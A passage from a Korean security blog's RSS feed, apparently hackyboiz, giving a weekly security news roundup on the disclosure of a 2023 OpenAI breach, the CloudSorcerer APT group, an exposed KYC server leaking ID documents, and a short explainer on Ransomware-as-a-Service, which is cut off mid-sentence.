&#xD2B8;&#xB9AC;&#xAC70; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, &#xC774;&#xB85C; &#xC778;&#xD574; &#xC2E4;&#xD589; &#xD30C;&#xC77C; &#xB4F1;&#xC744; overwrite&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; RCE&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/youtube-dl/">youtube-dl</category>
      
      <category domain="https://hackyboiz.github.io/tags/yt-dlp/">yt-dlp</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/17/l0ch/2024-07-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해킹짹짹🐣] 1년동안 해킹 사고를 숨긴 업계 1위 기업?!</title>
      <link>https://hackyboiz.github.io/2024/07/15/romi0x/newsletter0715/</link>
      <guid>https://hackyboiz.github.io/2024/07/15/romi0x/newsletter0715/</guid>
      <pubDate>Mon, 15 Jul 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! romi0x&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x1F600;&lt;/p&gt;
&lt;p&gt;&amp;#xD574;&amp;#xD0B9; &amp;#xC0AC;&amp;#xACE0;&amp;#xB97C; 1&amp;#xB</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! romi0x&#xC785;&#xB2C8;&#xB2E4; &#x1F600;</p><p>&#xD574;&#xD0B9; &#xC0AC;&#xACE0;&#xB97C; 1&#xB144; &#xB3D9;&#xC548; &#xC228;&#xAE34; &#xAE30;&#xC5C5; &#xB274;&#xC2A4;&#xBD80;&#xD130; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xD0C8;&#xD0C8; &#xD138;&#xB9B0; &#xB274;&#xC2A4;&#xAE4C;&#xC9C0; &#xC774;&#xBC88; &#xC8FC;&#xB3C4; &#xAF49;&#xAF49; &#xB2F4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!!</p><h2 id="&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;"><a href="#&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;" class="headerlink" title="&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;"></a>&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;</h2><blockquote><p> <strong>&#x1F5E3;&#xFE0F; &#xC624;&#xD508;AI&#xC5D0;&#xC11C; &#xC788;&#xC5C8;&#xB358; &#xD574;&#xD0B9; &#xC0AC;&#xACE0;, 1&#xB144; &#xB118;&#xAC8C; &#xC228;&#xACA8;&#xC84C;&#xB2E4;?</strong></p></blockquote><p>2024.07.09 | &#xBCF4;&#xC548;&#xB274;&#xC2A4; | <a href="https://www.boannews.com/media/view.asp?idx=131190">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a><br><img src="/2024/07/15/romi0x/newsletter0715/image1.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xC791;&#xB144; &#xCD08; &#xC624;&#xD508;AI&#xAC00; &#xD574;&#xD0B9;&#xC744; &#xB2F9;&#xD588;&#xB2E4;&#xB294; &#xCDA9;&#xACA9;&#xC801;&#xC778; &#xC0AC;&#xC2E4;&#x1F92F;&#xC774; <a href="https://www.nytimes.com/2024/07/04/technology/openai-hack.html">&#xB274;&#xC695;&#xD0C0;&#xC784;&#xC988;</a>&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB294; &#xC0AC;&#xB0B4; &#xBA54;&#xC2E0;&#xC800;&#xB97C; &#xD1B5;&#xD574; &#xC9C1;&#xC6D0;&#xB4E4;&#xC758; &#xB300;&#xD654; &#xB0B4;&#xC6A9;&#x1F4AC;&#xC744; &#xC218;&#xC9D1;&#xD588;&#xC73C;&#xBA70;, &#xC624;&#xD508;AI&#xC758; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAD00;&#xB828; &#xAE30;&#xC220;&#x1F916;&#xB3C4; &#xD0C8;&#xCDE8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC0AC;&#xAC74;&#xC740; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0DD;&#xD0DC;&#xACC4;&#xC758; &#xBD88;&#xC548;&#xC804;&#xC131;&#xACFC; &#xC624;&#xD508;AI&#xC758; &#xB0B4;&#xBD80; &#xAD00;&#xB9AC; &#xBB38;&#xC81C;&#xB97C; &#xB4DC;&#xB7EC;&#xB0C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#x26A0;&#xFE0F; <strong>&#xBB38;&#xC81C; 1: &#xB370;&#xC774;&#xD130; &#xCE68;&#xD574;&#xC640; &#xC815;&#xBCF4; &#xC740;&#xD3D0;</strong></p><p>&#xD574;&#xCEE4;&#xB294; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xD6C8;&#xB828;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC5D0;&#xB294; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC624;&#xD508;AI&#xB294; &#xC774; &#xC0AC;&#xAC74;&#xC774; &#xAD6D;&#xAC00; &#xC548;&#xBCF4;&#xC5D0; &#xC704;&#xD611;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xC5EC; &#xACF5;&#xAC1C;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xACE0; &#xD574;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC774;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130; &#xCC98;&#xB9AC;&#xC640; &#xC218;&#xAE09;&#xC5D0; &#xB300;&#xD55C; &#xBD88;&#xD22C;&#xBA85;&#xC131;&#xC744; &#xD574;&#xACB0;&#xD558;&#xB294; &#xB2F5;&#xBCC0;&#xC73C;&#xB85C;&#xB294; &#xBD80;&#xC871;&#xD558;&#xB2E4;&#xB294; &#xD3C9;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xB4E4;&#xC774; &#xCC57;GPT&#xC5D0; &#xC785;&#xB825;&#xD558;&#xB294; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC640; &#xD6C8;&#xB828; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD00;&#xB9AC;&#xB418;&#xB294;&#xC9C0; &#xBC1D;&#xD788;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC740; &#xD070; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.&#x1F937;&#x200D;&#x2642;&#xFE0F;</p><p>&#x26A0;&#xFE0F; <strong>&#xBB38;&#xC81C; 2: <a href="https://m.news.nate.com/view/20240518n07932">&#xB0B4;&#xBD80; &#xAC08;&#xB4F1;&#xACFC; &#xBCF4;&#xC548; &#xAD00;&#xB9AC;</a></strong></p><p>&#xB2F9;&#xC2DC; &#xC624;&#xD508;AI&#xC758; &#xAE30;&#xC220; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xAD00;&#xB9AC;&#xC790;&#xC600;&#xB358; &#xB808;&#xC624;&#xD3F4;&#xB4DC; &#xC544;&#xC174;&#xBE0C;&#xB808;&#xB108;&#xB294; &#xBCF4;&#xC548; &#xAC15;&#xD654;&#xB97C; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xC81C;&#xC548;&#xC11C;&#xB97C; &#xC81C;&#xCD9C;&#xD588;&#xC73C;&#xB098;, &#xC81C;&#xC548;&#xC740; &#xBB34;&#xC2DC;&#xB418;&#xC5C8;&#xACE0; , &#xC62C;&#xD574; &#xCD08; &#xD574;&#xACE0;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC174;&#xBE0C;&#xB808;&#xB108;&#xB294; &#xD68C;&#xC0AC;&#xC758; &#xBCF4;&#xC548; &#xBB38;&#xC81C;&#xB97C; &#xC9C0;&#xC801;&#xD55C; &#xAC83;&#xC774; &#xD574;&#xACE0; &#xC774;&#xC720;&#xB77C;&#xACE0; &#xC8FC;&#xC7A5;&#xD588;&#xC9C0;&#xB9CC;, &#xC624;&#xD508;AI&#xB294; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xC744; &#xC774;&#xC720;&#xB85C; &#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC624;&#xD508;AI &#xB0B4;&#xBD80;&#xC758; &#xD63C;&#xB780;&#xACFC; &#xAC08;&#xB4F1;&#xC774; &#xB4DC;&#xB7EC;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB144; 11&#xC6D4;, &#xC624;&#xD508;AI&#xC758; CEO &#xC0D8; &#xC62C;&#xD2B8;&#xB9CC;&#xC774; &#xD574;&#xACE0;&#xB418;&#xC5C8;&#xC73C;&#xB098;, &#xC9C1;&#xC6D0;&#xB4E4;&#xC758; &#xBC18;&#xBC1C;&#xB85C; &#xC77C;&#xC8FC;&#xC77C; &#xB9CC;&#xC5D0; &#xBCF5;&#xADC0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC62C;&#xD2B8;&#xB9CC;&#xC758; &#xD574;&#xACE0; &#xC774;&#xC720;&#xB294; &#xC784;&#xC6D0;&#xC9C4;&#xB4E4;&#xACFC;&#xC758; &#xBD88;&#xD654;&#xC640; &#xC18C;&#xD1B5; &#xBD80;&#xC7AC;&#xC600;&#xC73C;&#xB098;, &#xC774;&#xB294; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAC1C;&#xBC1C; &#xCCA0;&#xD559;&#xC758; &#xCC28;&#xC774;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC0AC;&#xAC74;&#xC740; &#xC624;&#xD508;AI &#xB0B4;&#xBD80;&#xC758; &#xC2E0;&#xB8B0; &#xBB38;&#xC81C;&#xB97C; &#xB354;&#xC6B1; &#xBD80;&#xAC01;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F926;&#x200D;&#x2642;&#xFE0F;</p><p>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAE30;&#xC220;&#xC740; &#xC6B0;&#xB9AC;&#xC758; &#xC0DD;&#xD65C;&#xC5D0; &#xD3B8;&#xB9AC;&#xD568;&#xC744; &#xAC00;&#xC838;&#xC624;&#xC9C0;&#xB9CC;, &#xADF8; &#xB4A4;&#xC5D0; &#xC228;&#xC740; &#xBCF4;&#xC548; &#xBB38;&#xC81C;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xD574;&#xACB0;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#x1F635;&#x200D;&#x1F4AB;</p><h2 id><a href="#" class="headerlink" title=" "></a> </h2><blockquote><p><strong>&#x26A0;&#xFE0F; &#xC0C8;&#xB85C;&#xC6B4; APT &#xADF8;&#xB8F9; &#x2018;CloudSorcerer&#x2019; &#xB4F1;&#xC7A5;: &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xAE30;&#xBC18;&#xC758; &#xC815;&#xAD50;&#xD55C; &#xACF5;&#xACA9;</strong></p></blockquote><p>2024.07.08 | The Hacker News | <a href="https://thehackernews.com/2024/07/new-apt-group-cloudsorcerer-targets.html">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a><br><img src="/2024/07/15/romi0x/newsletter0715/image2.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p><a href="https://thehackernews.com/2024/07/new-apt-group-cloudsorcerer-targets.html">&#xD574;&#xCEE4;&#xB274;&#xC2A4;</a>&#xC5D0; &#xB530;&#xB974;&#xBA74;, &#xCD5C;&#xADFC; &#x2018;CloudSorcerer&#x2019;&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; APT(Advanced Persistent Threat) &#xADF8;&#xB8F9;&#xC774; &#xB4F1;&#xC7A5;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB4E4;&#xC740; &#xC8FC;&#xB85C; &#xB7EC;&#xC2DC;&#xC544;&#x1F1F7;&#x1F1FA;&#xC758; &#xB2E8;&#xCCB4;&#xB4E4;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;&#xB97C;<a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;">C&amp;C(Command and Control</a>) &#xC11C;&#xBC84;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD2B9;&#xC9D5;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB4E4;&#xC758; &#xACF5;&#xACA9; &#xBC29;&#xC2DD;&#xC740; CloudWizard&#xB77C;&#xB294; &#xB2E4;&#xB978; &#xACF5;&#xACA9; &#xB2E8;&#xCCB4;&#xC640; &#xC720;&#xC0AC;&#xC810;&#xC774; &#xB9CE;&#xC73C;&#xB098;, &#xBA40;&#xC6E8;&#xC5B4; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC5D0; &#xC0C1;&#xB2F9;&#xD55C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC5B4; &#xB3D9;&#xC77C; &#xADF8;&#xB8F9;&#xC73C;&#xB85C; &#xBCF4;&#xAE30;&#xB294; &#xC5B4;&#xB835;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#x1F914;</p><p>&#xD604;&#xC7AC;&#xB85C;&#xC120; &#xD0C0;&#xAC9F;&#xC5D0; &#xCE68;&#xD22C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C; &#xC815;&#xD655;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xC54C;&#xB824;&#xC9C0;&#xC9C0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC;, &#xCD08;&#xAE30; &#xC811;&#xADFC;&#xC740; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xB9CC; &#xBC1D;&#xD600;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC31;&#xB3C4;&#xC5B4;&#xB294; &#xD53C;&#xD574;&#xC790;&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xD30C;&#xC77C; &#xBC0F; &#xD3F4;&#xB354; &#xC5F4;&#xAC70;, &#xC178; &#xBA85;&#xB839; &#xC2E4;&#xD589;, &#xD30C;&#xC77C; &#xC791;&#xC5C5; &#xC218;&#xD589;, &#xCD94;&#xAC00; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.&#x1F608;</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><blockquote><p><strong>&#x1F5E3;&#xFE0F; &#xAC1C;&#xC778; &#xC2E4;&#xBB3C;&#xC0AC;&#xC9C4;&#xC5D0; &#xC2E0;&#xBD84;&#xC99D;&#xB7;&#xC5EC;&#xAD8C;&#xAE4C;&#xC9C0; &#xB178;&#xCD9C;&#x2026;&#xC0AC;&#xAC01;&#xC9C0;&#xB300; &#xB193;&#xC778; &#xAC1C;&#xBC1C; &#xC11C;&#xBC84;</strong></p></blockquote><p>2024.07.09 | &#xC804;&#xC790;&#xC2E0;&#xBB38;  | <a href="https://www.etnews.com/20240708000171">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a><br><img src="/2024/07/15/romi0x/newsletter0715/image3.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p><a href="https://blog.criminalip.io/2024/07/05/kyc-system/">Criminal IP</a>&#xC5D0; &#xB530;&#xB974;&#xBA74;, &#xC57D; 1&#xB9CC;&#xC5EC; &#xAC74;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xB178;&#xCD9C;&#xD55C; &#xACE0;&#xAC1D;&#xD655;&#xC778;(<a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;">KYC</a>) &#xC11C;&#xBC84;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>KYC &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC218;&#xC9D1;&#xB41C; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB294; &#xC2E0;&#xBD84;&#xC99D;, &#xC5EC;&#xAD8C;, &#xC2E0;&#xBD84; &#xD655;&#xC778;&#xC744; &#xC704;&#xD55C; &#xD604;&#xC7AC; &#xBCF8;&#xC778; &#xC0AC;&#xC9C4; &#xB4F1; &#xB9CE;&#xC740; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xAD00;&#xB9AC; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD574; KYC &#xC778;&#xC99D; &#xC11C;&#xBC84;&#xC640; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBB34;&#xBC29;&#xBE44;&#xB85C; &#xC778;&#xD130;&#xB137;&#xC5D0; &#xB178;&#xCD9C;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F631;</p><p>2024&#xB144; 7&#xC6D4; 2&#xC77C;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; KYC &#xC11C;&#xBC84;&#xB294; &#xACE0;&#xAC1D;&#xC758; &#xC2E0;&#xBD84;&#xC99D;, &#xC5EC;&#xAD8C;&#xC0AC;&#xC9C4;, &#xC774;&#xB984;, &#xC0DD;&#xB144;&#xC6D4;&#xC77C; &#xB4F1;&#xC774; &#xB178;&#xCD9C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC11C;&#xBC84;&#xC5D0;&#xB294; &#xC804; &#xC138;&#xACC4;&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xB41C; &#xC57D; 1&#xB9CC; &#xAC74;&#xC758; &#xC720;&#xC800; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xC73C;&#xBA70;, &#xB300;&#xD55C;&#xBBFC;&#xAD6D; &#xC720;&#xC800; &#xC218;&#xB3C4; 684&#xBA85;&#xC5D0; &#xB2EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xC11C;&#xBC84;&#xB294; &#xC811;&#xADFC; &#xC81C;&#xC5B4;&#xAC00; &#xC804;&#xD600; &#xC5C6;&#xC5B4; &#xB204;&#xAD6C;&#xB098; &#xC720;&#xC800;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xC5F4;&#xB78C;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD655;&#xC778; &#xACB0;&#xACFC; &#xC774; &#xC11C;&#xBC84;&#xB294; &#xC2E4;&#xC81C; &#xAC00;&#xB3D9; &#xC911;&#xC778; &#xB77C;&#xC774;&#xBE0C; &#xC11C;&#xBC84;&#xAC00; &#xC544;&#xB2CC; &#xAC1C;&#xBC1C;&#xC6A9; &#xC11C;&#xBC84;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xBA70;, &#xBC29;&#xD654;&#xBCBD; &#xC124;&#xC815; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xB178;&#xCD9C;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#x1F633;</p><h2 id="&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;"><a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;" class="headerlink" title="&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C; &#xBB3C;&#xC5B4;&#xBD10; "></a>&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C; &#xBB3C;&#xC5B4;&#xBD10; <img src="/img/keyword.gif" width="30" height="30" style="float:left;"></h2><ul><li>KYC(Know Your Customer)<ul><li>&#xAE08;&#xC735;&#xAD8C;&#xACFC; &#xAC00;&#xC0C1;&#xD654;&#xD3D0; &#xAC70;&#xB798;&#xC18C;&#xC5D0;&#xC11C; &#xACE0;&#xAC1D;&#xC774; &#xBCF8;&#xC778; &#xACC4;&#xC815;&#xC784;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xC808;&#xCC28;&#xB85C;, &#xC2E0;&#xBD84;&#xC99D;&#xC774;&#xB098; &#xC5EC;&#xAD8C; &#xB4F1;&#xC744; &#xAE08;&#xC735;&#xD68C;&#xC0AC;&#xC5D0; &#xC81C;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xC2DD;</li></ul></li><li>C&amp;C(Command and Control)<ul><li>&#xAC10;&#xC5FC;&#xB41C; &#xAE30;&#xACC4; &#xB610;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xACE0; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xB3C4;&#xAD6C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xACF5;&#xACA9; &#xC720;&#xD615;</li></ul></li></ul><h3 id="&#xC9C0;&#xC2DD;-PLUS-&#x2795;"><a href="#&#xC9C0;&#xC2DD;-PLUS-&#x2795;" class="headerlink" title="&#xC9C0;&#xC2DD; PLUS &#x2795;"></a>&#xC9C0;&#xC2DD; PLUS &#x2795;</h3><ul><li><a href="https://www.boannews.com/media/view.asp?idx=131161&amp;direct=mobile">&#xC804; &#xC138;&#xACC4; &#xAC00;&#xC7A5; &#xB9CE;&#xC740; &#xBCF4;&#xC548;&#xCDE8;&#xC57D;&#xC810; &#xC218;&#xB97C; &#xACF5;&#xAC1C;&#xD55C; &#xBCF4;&#xC548;&#xAE30;&#xC5C5;&#xC740;? &#xD2B8;&#xB80C;&#xB4DC;&#xB9C8;&#xC774;&#xD06C;&#xB85C;</a></li><li><a href="https://www.boannews.com/media/view.asp?idx=131200">&#xB2E4;&#xD06C;&#xC6F9;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xC5ED;&#xC0AC;&#xC0C1; &#xAC00;&#xC7A5; &#xD070; &#xBE44;&#xBC00;&#xBC88;&#xD638; DB, &#xB85D;&#xC720;2024</a></li><li><a href="https://www.boannews.com/media/view.asp?idx=131174">&#xC0C8;&#xB85C;&#xC6B4; &#xBD07;&#xB137; &#xBA40;&#xC6E8;&#xC5B4; &#xC800;&#xADF8;&#xC5D0;&#xCE74;, &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5; &#xD0D1;&#xC7AC;&#xD55C; &#xCC44; &#xD65C;&#xB3D9; &#xC911;</a></li></ul><h2 id="&#xC774;&#xBC88;&#xC8FC;-&#xBCF4;&#xC548;&#xC6A9;&#xC5B4;-&#x1F425;"><a href="#&#xC774;&#xBC88;&#xC8FC;-&#xBCF4;&#xC548;&#xC6A9;&#xC5B4;-&#x1F425;" class="headerlink" title="&#xC774;&#xBC88;&#xC8FC; &#xBCF4;&#xC548;&#xC6A9;&#xC5B4; &#x1F425;"></a><strong>&#xC774;&#xBC88;&#xC8FC; &#xBCF4;&#xC548;&#xC6A9;&#xC5B4;</strong> &#x1F425;</h2><blockquote><p><strong>Ransomware-as-a-Service (RaaS)</strong></p></blockquote><p><img src="/2024/07/15/romi0x/newsletter0715/image4.png" alt="&#xC0AC;&#xC9C4;"></p><p>RaaS&#xB294; <strong>&#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xACF5;&#xACA9;&#xC744; &#xC11C;&#xBE44;&#xC2A4; &#xD615;&#xD0DC;&#xB85C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xBAA8;&#xB378;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>RaaS&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xC220; &#xC9C0;&#xC2DD;&#xC774; &#xBD80;&#xC871;&#xD55C; &#xBC94;&#xC8C4;&#xC790;&#xB3C4; &#xC27D;&#xAC8C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC30;&#xD3EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; RaaS &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xACF5;&#xACA9;&#xC744; &#xACC4;&#xD68D;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xBA70;, &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;&#xC790;&#xB294; &#xC131;&#xACF5;&#xC801;&#xC778; &#xACF5;&#xACA9; &#xC2DC; &#xC218;&#xC775;&#xC744; &#xB098;&#xB220; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, GandCrab&#xACFC; <a href="https://www.nomios.com/resources/what-is-revil-ransomware/">REvil</a> &#xAC19;&#xC740; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; RaaS &#xD615;&#xD0DC;&#xB85C; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xCE5C;&#xD654;&#xC801;&#xC778; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;&#xC640; 24&#xC2DC;&#xAC04; &#xC9C0;&#xC6D0;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC5EC;, &#xB204;&#xAD6C;&#xB098; &#xC27D;&#xAC8C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. GandCrab&#xC740; 2018&#xB144;&#xC5D0; &#xCC98;&#xC74C; &#xB4F1;&#xC7A5;&#xD558;&#xC5EC; &#xBE60;&#xB974;&#xAC8C; &#xD655;&#xC0B0;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xD604;&#xC7AC;&#xB294; &#xC0AC;&#xC2E4;&#xC0C1; &#xC790;&#xCDE8;&#xB97C; &#xAC10;&#xCD98; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. REvil&#xC740; &#xAC15;&#xB825;&#xD55C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xB2E4;&#xD06C; &#xC6F9;&#xC5D0;&#xC11C; &#xD310;&#xB9E4;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xACF5;&#xAE09;&#xB9DD;&#xC744; &#xACF5;&#xACA9;&#xD558;&#xC5EC; &#xD070; &#xD53C;&#xD574;&#xB97C; 